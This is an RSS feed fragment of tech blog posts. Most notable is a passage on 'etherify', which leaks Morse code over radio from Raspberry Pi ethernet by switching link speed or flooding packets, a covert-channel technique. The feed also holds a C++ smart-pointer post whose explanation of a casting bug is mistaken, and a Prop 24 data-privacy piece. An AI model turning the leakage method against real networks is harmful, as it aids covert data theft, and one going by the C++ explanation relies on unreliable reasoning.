<p><strong>Equipment used and experiment description</strong></p>
<p>The RF radiation differs with different equipment and ethernet cable type being used. In order to make this demo reproducible i used two Raspberry PI 4, because it makes it easy for everyone to obtain the exact hardware that was used for this experiment. The raspberry PIs were connected using the ethernet cable supplied with the official Raspberry PI 4 starter kit. The stock Raspbian 10 operating system, which was supplied on the SD cards&nbsp; in the Starter Kit, was used. The devices were accessed via the serial console.</p>
<p>Power was provided via powerbanks. This was to avoid a connection to the mains voltage, because the powerline could be an unintentional radiator.</p>
<p>The Raspberry PIs were laid on a wooden bench about 1.4m from each other.</p>
<p>The experiment was conducted in an electromagnetically quiet area.</p>
<figure id="attachment_83" aria-describedby="caption-attachment-83"><img loading="lazy" src="https://lipkowski.com/wp-content/uploads/2020/11/rpi_etherify.jpg" alt="" width="843" height="355"><figcaption id="caption-attachment-83">Raspberry PI etherify demo</figcaption></figure>
<p>The signal was received via a Moxon antenna built for 125MHz and a Yaesu FT-817 transceiver with a 500Hz CW filter. Morse code was received and decoded by ear.</p>
<p>The experiments can be repeated with other devices with ethernet ports, for example two laptops, running any linux distribution and the required tools installed (most will come with them out of the box). The devices should be able to establish an ethernet link very quickly upon switching speed. An SDR receiver can be used for reception, with any antenna that can receive 125MHz (test first at close range). Morse code decoding can be done via software, for example fldigi [3].</p>
<p>The easiest receive setup would probably be gqrx with an rtl-sdr dongle, and fldigi for deciding the signals. If the signal is not decoded, it should be played to someone who can receive morse code by ear. Often such person will be able to decode it with ease.</p>
<p>The experiment should be first conducted in an electromagnetically quiet area, nearby ethernet networks will generate a lot of interference. If testing in the vicinity of other ethernet networks move the antenna closer, and reduce the receiver gain as much as possible.</p>
<p><strong>How to replicate with your own hardware</strong></p>
<p>This can be replicated with other ethernet hardware, but with varying results.</p>
<p>The speed at which the ethernet hardware can renegotiate different speed sets the maximum speed of etherify 1 transmission. The&nbsp; ethernet port on the raspberry pi 4 can change speed very quickly. Other hardware will have a delay when chaging speed, for example on an Dell Latitude 5310 running with Debian bullseye (e1000e 3.2.6-k driver) it takes about 5 seconds to change speed. Lower modulation speed means lower datarate, but also better signal/noise when decoding.</p>
<p>The clock frequency modulation under packet load observed on the raspberry pi 4 (etherify 2) is specific to the raspberry pi 4. However loading the interface with packets often has effects on the electromagnetic spectrum on different hardware.</p>
<p>To check your hardware:</p>
<ul>
<li>look at the spectrum around 125MHz</li>
<li>ensure that the interface is up</li>
<li>change speed with ethtool to 10Mbps, 100Mbps, 1Gbps and observe the spectrum</li>
<li>try enabling/disabling eee (energy efficient ethernet), observe the effects at different speeds</li>
<li>try loading the interface with packets, observe the effects at different speeds</li>
<li>look at different ethtool settings and module options, especially those concerning power saving, carrier delay etc.</li>
<li>allow a few seconds after changing each parameter, on some interfaces it takes some time to change parameters</li>
<li>keep in mind that both ends of the ethernet link have an effect on he transmission. For experiments it’s best to use the same hardware on both ends.</li>
</ul>
<p>If you find something interesting, then please send me an email.</p>
<p><strong>Discussion</strong></p>
<p>The signal was shown to be decodable by ear at 100m for etherify 1, and 30m for etherify 2. This was done via a simple antenna and modest receiver. An antenna with more gain and better receiver would surely yield better range.</p>
<p>Nearby ethernet networks will generate a lot of interference at the same frequencies. The 125MHz frequency falls in the 108-137MHz air band, and one can expect interference from strong signals on nearby frequencies from nearby airplanes and airports. Therefore first tests should be conducted in areas with less interference, such as outdoor areas or underground parking lots.</p>
<p>The 125MHz frequency was chosen because of avaliable equipment. It would be hard for one person to hold and operate an antenna, laptop and SDR receiver. Other frequencies may be better.</p>
<p>Etherify 1 yields better range, however etherify 2 may enable to use a device located somewhere else in the network as the transmitter. This device may be physically closer to the receiver or may have greater leakage from the ethernet cable. Etherify 2 can be exploited as a non-root user by flooding the network with UDP datagrams or possibly other data.</p>
<p>The “software” side is intentionally a very primitive silly hack.</p>
<p>I haven’t done an extensive search for similar prior publications, but a few quick searches didn’t yield any results. If you know of any, please let me know.</p>
<p>If you cite this, …</p></div></article></main></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lipkowski.com/etherify/">https://lipkowski.com/etherify/</a></em></p>]]>
            </description>
            <link>https://lipkowski.com/etherify/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012469</guid>
            <pubDate>Sat, 07 Nov 2020 00:49:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Curious Pointers of Modern C++]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25012468">thread link</a>) | @logicry
<br/>
November 6, 2020 | https://blog.digitalreverie.com/posts/cpp-curious-pointers/ | <a href="https://web.archive.org/web/*/https://blog.digitalreverie.com/posts/cpp-curious-pointers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
        
    <article>
        <h4>Published: November 6, 2020</h4>
        
<p>I’ve been studying quite a bit of modern C++ (using C++17) lately because of a side project and I have picked up some oddities and gotchas when it comes to pointers, specifically smart pointers.</p>
<p>I must note that I am by no means a seasoned C++ Engineer, nevertheless, I ran &amp; debugged all the examples below on Mac OS Catalina 10.15.7.</p>

<p>These are the helpers to instantiate a smart pointer.</p>
<p>Now consider the following example where we would just instantiate a base class <code>Animal</code>.
There are many ways to instantiate <code>Animal</code> as a <code>unique_ptr</code>. I listed the most common below.</p>
<div><pre><code data-lang="c++"><span>#include</span> <span>&lt;memory&gt;</span><span>
</span><span></span>
<span>class</span> <span>Animal</span> {
<span>public</span><span>:</span>
    <span>virtual</span> <span>~</span>Animal() <span>=</span> <span>default</span>;
    <span>virtual</span> std<span>::</span>string name() <span>const</span> {
        <span>return</span> <span>"I'm an animal"</span>;
    }
};

<span>int</span> <span>main</span>() {
    <span>// using 'new' keyword
</span><span></span>    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> buddyA(<span>new</span> Animal);
    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> buddyB <span>=</span> std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Animal);
    <span>auto</span>                    buddyC <span>=</span> std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Animal);

    <span>// using make_unique helper
</span><span></span>    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> charlieA <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Animal<span>&gt;</span>(Animal());
    <span>auto</span>                    charlieB <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Animal<span>&gt;</span>(Animal());
}
</code></pre></div><p>As you can see, the last option where we instantiate <code>Animal</code> into <code>charlieB</code> variable looks pretty easy. The main advantage
of using <code>make_unique</code> is the lack of <code>new</code> keyword. That’s because <code>new</code> resonates manual memory management and modern C++ would
like you to avoid using it when using smart pointers, because the smart pointer will always call delete in its destructor.</p>
<p>Use make_unique they said, avoid using <code>new</code> they said, and so I did. Until I hit a roadblock when debugging a polymorphic object
that was supposed to be a derived class in runtime, but behaved as a base class.</p>
<p>Remember the Animal base class from above? We’ll add <code>Dog</code> class below that will inherit from <code>Animal</code>.</p>
<div><pre><code data-lang="c++"><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
<span>public</span><span>:</span>
    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a dog"</span>;
    }
};
</code></pre></div><p>Now we can try to implement polymorphism by creating an instance of <code>Dog</code> into an <code>Animal</code> pointer.</p>
<div><pre><code data-lang="c++"><span>int</span> <span>main</span>() {
    <span>auto</span> charlieB <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Animal<span>&gt;</span>(Dog());
    
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Name is: "</span> <span>&lt;&lt;</span> charlieB<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
    <span>// Output -&gt; Name is: I'm an animal
</span><span></span>}
</code></pre></div><p>Isn’t that weird? We created a Dog object! Well, yes and no. Let’s break it down:</p>
<ol>
<li>We created an instance of <code>Dog</code></li>
<li>The instance was passed as an argument to <code>make_unique</code></li>
<li>Here it comes, if you look at source code of <code>make_unique</code> function, you’ll see it’s primitive. It just creates
a new object of type <code>T</code> (<code>Animal</code> in our case) on the heap, using <code>new</code> operator. We could express the internal operation as:</li>
</ol>
<div><pre><code data-lang="c++">Dog d;
Animal<span>*</span> a <span>=</span> <span>new</span> Animal(d);
</code></pre></div><p>So yes, we did pass a Dog object, but it will be downcast to Animal in order to create a new instance of Animal using one of the built-in constructors:</p>
<div><pre><code data-lang="c++"><span>// Animal has this generated constructor (among others) by default
</span><span></span>Animal(<span>const</span> Animal<span>&amp;</span>);
</code></pre></div><h3 id="edit---thanks-to-crifferiushttpstwittercomcrifferius-and-arganoidhttpstwittercomarganoid">Edit - thanks to <a href="https://twitter.com/crifferius">@crifferius</a> and <a href="https://twitter.com/arganoid">@arganoid</a></h3>
<p>The scenario from above leads to an incorrect and confusing behavior. It was my understanding of <code>make_shared</code> &amp; <code>make_unique</code> that was incorrect.</p>
<p>Nevertheless, I think it’s still important to mention it, as the program compiles successfully (no warnings), with an unexpected behavior,
especially for people coming to C++ from another language.</p>
<p><code>make_unique</code> and <code>make_shared</code> actually forward parameters, so you should use them with the derived class type as shown below for <code>charlieC</code>.</p>
<div><pre><code data-lang="c++"><span>int</span> <span>main</span>() {
    <span>auto</span> charlieB <span>=</span> std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Dog());
    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> charlieC <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Dog<span>&gt;</span>(); <span>// Preferred
</span><span></span>    
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Name is: "</span> <span>&lt;&lt;</span> charlieB<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
    <span>// Output -&gt; Name is: I'm a dog
</span><span></span>}
</code></pre></div><p>If the <code>Dog</code> had parameters in a constructor, you would simply pass those into the <code>make_shared</code> / <code>make_unique</code> helper
as shown below:</p>
<div><pre><code data-lang="C++"><span>// Let's modify Dog only for this example
</span><span></span><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
    std<span>::</span>string name_;
<span>public</span><span>:</span>
    Dog(std<span>::</span>string name) <span>:</span> name_(name) {}

    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a dog: "</span> <span>+</span> name_;
    }
};

<span>int</span> <span>main</span>() {
    std<span>::</span>unique_ptr<span>&lt;</span>Animal<span>&gt;</span> charlieC <span>=</span> std<span>::</span>make_unique<span>&lt;</span>Dog<span>&gt;</span>(<span>"Poodle"</span>);
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Name is: "</span> <span>&lt;&lt;</span> charlieB<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
    <span>// Output -&gt; Name is: I'm a dog: Poodle
</span><span></span>}
</code></pre></div>
<p>References are great. They are like pointers, but cannot be <strong>nullptr</strong> (you could technically workaround and store <strong>NULL/nullptr</strong> in a reference, but that leads to undefined behavior and I won’t present such a bad practice here).</p>
<p>Not only references are not optional, but they also depict another paradigm. When we accept a reference parameter in a function/method,
it means we don’t own the underlying value, nor we store it, although we might modify it (depending on whether the parameter is marked as <code>const</code>).</p>
<p>The first section of this article mentioned polymorphism. Given our examples above, we might need an array of <code>Animal</code> objects. Some could be <code>Dog</code>, <code>Cat</code>, or other. We might not know in compile time.</p>
<p>Now what if we need to walk through though the array and if it’s a dog, we want to print out the breed? For that, we will need casting.
There are multiple types of casting, let me just briefly introduce just a few:</p>
<ul>
<li><code>static_cast</code> - casts as a given type, no runtime check</li>
<li><code>dynamic_cast</code> - casts as a given type, if it’s compatible. It will run a runtime check. In case of an error, if we’re casting to a pointer, the result will be a <code>nullptr</code> value. If we’re casting to a reference, a <code>std::bad_cast</code> exception will be thrown.</li>
</ul>
<p>There are also cast helpers when you work with <code>shared_ptr</code>. Those are convenient as they unwrap the smart pointer for us.</p>
<ul>
<li><code>std::dynamic_pointer_cast</code></li>
<li><code>std::static_pointer_cast</code></li>
</ul>
<p>Let’s modify our original example a bit:</p>
<ol>
<li>Create a virtual method breed() in <code>Dog</code> class</li>
<li>Create <code>Husky</code> class that inherits from <code>Dog</code> and implements breed()</li>
<li>Create <code>Cat</code> class just to have another type of animal</li>
</ol>
<div><pre><code data-lang="c++"><span>class</span> <span>Dog</span><span>:</span> <span>public</span> Animal {
<span>public</span><span>:</span>
    <span>virtual</span> <span>~</span>Dog() <span>=</span> <span>default</span>;
    <span>virtual</span> std<span>::</span>string breed() <span>const</span> {
        <span>throw</span> std<span>::</span>runtime_error(<span>"Dog.breed() should be implemented by a derived class"</span>);
    }

    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a dog"</span>;
    }
};

<span>class</span> <span>Cat</span><span>:</span> <span>public</span> Animal {
    std<span>::</span>string name() <span>const</span> <span>override</span> {
        <span>return</span> <span>"I'm a cat"</span>;
    }
};

<span>class</span> <span>Husky</span><span>:</span> <span>public</span> Dog {
<span>public</span><span>:</span>
  std<span>::</span>string breed() <span>const</span> <span>override</span> {
      <span>return</span> <span>"Husky"</span>;
  }
};
</code></pre></div><p>Time to create our animal array. Remember, not all animals are dogs, so we’ll first have to try to upcast an <code>Animal&amp;</code> to a <code>Dog&amp;</code> and if it works,
we can print out the breed.</p>
<div><pre><code data-lang="c++">
<span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal);

<span>int</span> <span>main</span>() {
    std<span>::</span>vector<span>&lt;</span>std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;&gt;</span> animals;

    animals.emplace_back(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Husky));
    animals.emplace_back(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Cat));

    <span>for</span> (<span>const</span> <span>auto</span><span>&amp;</span> animal : animals) {
        <span>// ignore this function for now, we'll define it in a minute
</span><span></span>        printDogBreed(<span>*</span>animal);
    }
}
</code></pre></div><p>We created an array with one dog and one cat. The function <code>printDogBreed</code> is yet to be defined. We will want to pass
a reference of <code>Animal</code> to the function and let it either print out the breed (if the animal is a dog) or do nothing.</p>
<p>For those who don’t know, the asterisk operator in <code>shared_ptr</code> is overloaded to return a reference of the stored object.</p>
<p>Let’s define <code>printDogBreed</code> function now:</p>
<div><pre><code data-lang="c++"><span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal) {
    <span>try</span> {
        <span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Dog<span>&amp;&gt;</span>(animal);
        std<span>::</span>cout <span>&lt;&lt;</span> <span>"Breed is: "</span> <span>&lt;&lt;</span> dog.breed() <span>&lt;&lt;</span> std<span>::</span>endl;
    } <span>catch</span> (<span>const</span> std<span>::</span>bad_cast<span>&amp;</span> e) {
        <span>// do nothing, it's not a dog
</span><span></span>    }
}
</code></pre></div><p>This is pretty straightforward no? We take a const reference of <code>Animal</code> (as we don’t need to modify it) and try
to upcast it to a Dog reference.</p>
<p>We would expect (or I would anyway), that the program would output our husky dog breed. Unfortunately, that’s not what happens.</p>
<p>The application will crash on a <code>std::runtime_error</code> exception thrown from the base <code>Dog</code> class’ <code>breed()</code> method.</p>
<h3 id="why-why-why">Why, why, why?</h3>
<p>Well, that’s a good question. The underlying object is a <code>Dog</code>, but most importantly it’s <code>Husky</code>, so we would expect
the virtual method <code>breed()</code> to print out <code>Husky</code>.</p>
<p>For some reason (I would really love to give you a full in-detail explanation on this, if you know, please message us on <a href="https://twitter.com/digreverie">twitter</a>.), the cast
itself is valid, but it’s also hard-wired to <code>Dog</code> type, or its vtable is erased, who knows.</p>
<p>If we were to replace the line and cast directly to <code>Husky</code>, everything would work as expected. But we don’t want to specify the type of dog. As we might add more types in the future.</p>
<div><pre><code data-lang="c++"><span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Husky<span>&amp;&gt;</span>(animal);
</code></pre></div><h3 id="cast-to-pointer-for-the-rescue">Cast to pointer for the rescue</h3>
<p>Luckily, the solution is rather simple. We “just” have to cast to a <code>Dog</code> pointer, that will behave correctly in runtime, dispatching the right virtual method.
Notice the <code>&amp;</code> before animal. We’re basically taking an address of the <code>Animal</code> reference, which will lead us to the pointer.</p>
<div><pre><code data-lang="c++"><span>void</span> <span>printDogBreed</span>(<span>const</span> Animal<span>&amp;</span> animal) {
    <span>if</span> (<span>auto</span> dog <span>=</span> <span>dynamic_cast</span><span>&lt;</span><span>const</span> Dog<span>*&gt;</span>(<span>&amp;</span>animal)) {
        std<span>::</span>cout <span>&lt;&lt;</span> <span>"Breed is: "</span> <span>&lt;&lt;</span> dog<span>-&gt;</span>breed() <span>&lt;&lt;</span> std<span>::</span>endl;
    }
}
</code></pre></div>
<p>This one almost got me bald from pulling my hair. Consider the following code:</p>
<div><pre><code data-lang="c++"><span> 1</span><span>// Note this function defines a reference of shared_ptr as the function parameter.
</span><span><span> 2</span><span></span><span>void</span> <span>shuffleAnimal</span>(std<span>::</span>function<span>&lt;</span><span>void</span>(std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;&amp;</span>)<span>&gt;</span> f) {
</span><span> 3</span>    <span>auto</span> animal <span>=</span> std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span>(<span>new</span> Husky);
<span> 4</span>    f(animal);
<span> 5</span>
<span> 6</span>    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Picked animal name: "</span> <span>&lt;&lt;</span> animal<span>-&gt;</span>name() <span>&lt;&lt;</span> std<span>::</span>endl;
<span> 7</span>}
<span> 8</span>
<span> 9</span><span>int</span> <span>main</span>() {
<span>10</span>    <span>// but caller can implement it without a reference, as such:
</span><span><span>11</span><span></span>    shuffleAnimal([](std<span>::</span>shared_ptr<span>&lt;</span>Animal<span>&gt;</span> animal) {
</span><span>12</span>        animal.reset(<span>new</span> Cat);
<span>13</span>    });
<span>14</span>}
</code></pre></div>
<p>The function <code>shuffleAnimal</code> lets the caller shuffle the initial Animal it provides. As you can see, we provide a mutable
reference of <code>shared_ptr</code>.</p>
<p>Notice the caller does <strong>NOT</strong> implement the parameter correctly, as it omits the reference mark!</p>
<p>This would not fly with <code>unique_ptr</code> those cannot be copied, so you’d encounter a compilation error.</p>
<p>Since this program will build …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.digitalreverie.com/posts/cpp-curious-pointers/">https://blog.digitalreverie.com/posts/cpp-curious-pointers/</a></em></p>]]>
            </description>
            <link>https://blog.digitalreverie.com/posts/cpp-curious-pointers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012468</guid>
            <pubDate>Sat, 07 Nov 2020 00:49:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google’s File System Access API is not a standard]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012438">thread link</a>) | @SimeVidas
<br/>
November 6, 2020 | https://webplatform.news/issues/2020-11-06 | <a href="https://web.archive.org/web/*/https://webplatform.news/issues/2020-11-06">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://webplatform.news/issues/2020-11-06</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012438</guid>
            <pubDate>Sat, 07 Nov 2020 00:42:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Prop 24 Puts Anonymized Data at Greater Risk of Re-Identification]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012366">thread link</a>) | @icoe
<br/>
November 6, 2020 | https://www.tonic.ai/post/prop-24-anonymized-data-greater-risk-re-identification | <a href="https://web.archive.org/web/*/https://www.tonic.ai/post/prop-24-anonymized-data-greater-risk-re-identification">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Californians voted Yes on <a href="https://vig.cdn.sos.ca.gov/2020/general/pdf/topl-prop24.pdf">Prop 24</a>, approving extensive amendments to the <a href="https://leginfo.legislature.ca.gov/faces/billTextClient.xhtml?bill_id=201720180SB1121">California Consumer Privacy Act</a> with the mindset of strengthening the U.S.’s most comprehensive data privacy regulation to date. But one of its provisions undermines that goal in a way that puts both individual privacy and corporate security at a heightened risk.<br></p><p>Specifically, a collection of amendments grants service providers expanded powers to combine consumer datasets obtained from different sources (see Secs. 1798.140(ag)(1) and 1798.185(e)(10)).<strong> In the world of data anonymization, the risks of combining datasets </strong><a href="https://www.nature.com/articles/s41467-019-10933-3/"><strong>are</strong></a><strong> </strong><a href="https://techcrunch.com/2019/07/24/researchers-spotlight-the-lie-of-anonymous-data/"><strong>well</strong></a><strong> </strong><a href="https://www.sciencedaily.com/releases/2018/12/181207144403.htm"><strong>known</strong></a><strong>.</strong> When paired with additional data, individuals in many anonymized datasets are surprisingly easy to re-identify. This can be due to uneven approaches in anonymization, as well as the simple benefit of added data points. Real-world instances include <a href="https://fpf.org/wp-content/uploads/The-Re-identification-of-Governor-Welds-Medical-Information-Daniel-Barth-Jones.pdf">anonymized medical records</a> being re-identified when pooled with voter databases; the infamous <a href="https://arxiv.org/abs/cs/0610105">Netflix user re-identification</a> achieved by combining anonymized Netflix data with IMDB user movie ratings; and <a href="https://www.forbes.com/sites/simonchandler/2019/09/04/researchers-use-big-data-and-ai-to-remove-legal-confidentiality/?sh=24ba16ec15f6">anonymized Swiss Supreme Court cases</a> involving pharmaceutical companies being re-identified using publicly available databases.<br></p><p>We’ve talked previously about how the <a href="https://www.tonic.ai/post/ccpa-will-hit-your-dev-team-harder-than-gdpr">CCPA impacts dev teams</a> thanks to its extremely broad definition of the types of data requiring protection. Today, we’ll look at how Prop 24 throws that data under the bus by loosening its restrictions on data pooling.<br></p><h3>A practical example<br></h3><p>Imagine there’s a handful of companies in the same industry, say EdTech, all working with the same third-party service provider to debug software, perform testing, or develop apps. Each of these companies anonymizes their users’ data prior to sharing it with the service provider. Thanks to Prop 24, the service provider pools those datasets to maximize their work. Then the service provider experiences a breach. Individually, those anonymized user datasets may have been safe from re-identification. But combined, they make it much easier to connect the dots and re-identify users with as much as a <a href="https://www.nature.com/articles/s41467-019-10933-3/">99.9% rate of accuracy</a>.<br></p><p>The end result? Multiple companies grappling with crisis management thanks to a single data leak of “anonymized” data. The inclusion of this provision in the newly-passed Prop 24 significantly weakens the individual privacy protections that the CCPA otherwise aims to safeguard. What’s more, it weakens a company’s ability to ensure the privacy of their data when working with third parties.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f0ae1534d32e5a91598eb9c/5fa5e8d498f39f28e061d229_wpTaqICtlYpRVLx4exhENOlsJh4wo898y97N_2Hhc6DJKYk06ryDg5nZj1yv5gBOa0s9DHtrJhQYE8CEg8WAzHkT_NqrcOsbFFUp_m75LDSJTiJVx742PBA69hqfJQSgvMrT25dm.png" alt=""></p></figure><h3><strong>What to do about it</strong><br></h3><p>More and more companies are relying on third-party providers to expand their development teams, outsource QA testing, or engage in other ways that rely on shared datasets. Where the law opens the door to data pooling, concerned companies should specify in their contracts if they want that door kept firmly shut.<br></p><p>But maybe a company stands to benefit from the provider having a larger pool of data to work with. In that case, here are two approaches that allow for reaping the benefits of working with third-parties without upping the risks to data security.<br></p><h4>Ironclad data de-identification</h4><p>Simple redaction, pseudonymization, and sampling aren’t going to cut it. Advanced subsetting paired with full database obfuscation? Now we’re talking. Data beyond what the law defines as “sensitive personal information” and “unique identifiers” could be used to re-identify individuals when combined with other datasets. Taking a more comprehensive approach to data de-identification provides the safeguards needed against re-identification due to data pooling. And with tools like those available in <a href="https://www.tonic.ai/product">Tonic</a> to link columns and preserve relationships in the protected output dataset, companies can strengthen their data security without sacrificing their data’s utility.</p><h4>Data synthesis with differential privacy&nbsp;</h4><p>For the strongest in data security, data synthesis performed with differential privacy at its core not only provides mathematical guarantees for data protection, it also allows for scaling up datasets to any size to equip developers with the amount of realistic, yet wholly fictitious, data they need to do their best work. Here, too, Tonic is <a href="https://www.tonic.ai/post/differential-privacy-comes-to-tonic">leading the charge</a>.<br></p><h3>Why companies should act<br></h3><p>Two additional components of Prop 24 and the CPPA are worth highlighting. First, Prop 24 establishes the California Privacy Protection Agency, expanding the resources available to implement and enforce the CCPA (see Sec. 1798.199.10). This strengthens the state’s ability to take legal action against companies that violate privacy rights.<br></p><p>Second, Prop 24 missed an opportunity to bring the CCPA in line with GDPR in requiring that companies have <a href="https://iapp.org/news/a/yes-how-opt-in-consent-really-works/">users opt into data collection</a>, as opposed to leaving the burden with users to opt out. Essentially what this means is that under the CCPA privacy is not the default. And most consumers won’t take the time to click through pop-ups, on/off forms, or privacy settings to make the opt-out change.<br></p><p>This leaves the onus on companies to do right by the data they're collecting by default in order to avoid the legal ramifications that are now easier to enforce.<br></p><p>CCPA and Prop 24 are designed to protect consumers. In the best of worlds, protecting consumers also means protecting businesses from the fallout of poor data practices. Despite its best intentions, Prop 24 stumbles in achieving these goals. Enabling service providers to combine datasets makes companies who work with third-parties more vulnerable to data leaks, despite the protections those companies may have put in place through data anonymization.</p><p>Where Prop 24 does succeed is in paving a clear path for taking legal action against companies who misuse or fail to protect their users’ data. It’s up to companies to implement strong data protection practices regardless of the law’s lax requirements, to avoid costly fines and damaging leaks.<br></p></div><div><h2>What’s a Rich Text element?</h2><p>The rich text element allows you to create and format headings, paragraphs, blockquotes, images, and video all in one place instead of having to add and format them individually. Just double-click and easily create content.</p><h5>Static and dynamic content editing</h5><blockquote>Static and dynamic content editing</blockquote><p>‍</p><h6>Static and dynamic content editing</h6><p>A rich text element can be used with static or dynamic content. For static content, just drop it into any page and begin editing. For dynamic content, add a rich text field to any collection and then <strong>connect</strong> a rich text element to that field in the settings panel. Voila!</p><h4>How to customize formatting for each rich text</h4><p>Headings, paragraphs, blockquotes, figures, images, and figure captions can all be styled after a class is added to the rich text element using the "When inside of" nested selector system.</p></div></div>]]>
            </description>
            <link>https://www.tonic.ai/post/prop-24-anonymized-data-greater-risk-re-identification</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012366</guid>
            <pubDate>Sat, 07 Nov 2020 00:27:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Everything you need to know about UX/UI at a high-level]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25012270">thread link</a>) | @Whiskeyjck
<br/>
November 6, 2020 | http://www.kickassux.com/vault | <a href="https://web.archive.org/web/*/http://www.kickassux.com/vault">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.kickassux.com/vault</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012270</guid>
            <pubDate>Sat, 07 Nov 2020 00:03:05 GMT</pubDate>
        </item>
    </channel>
</rss>
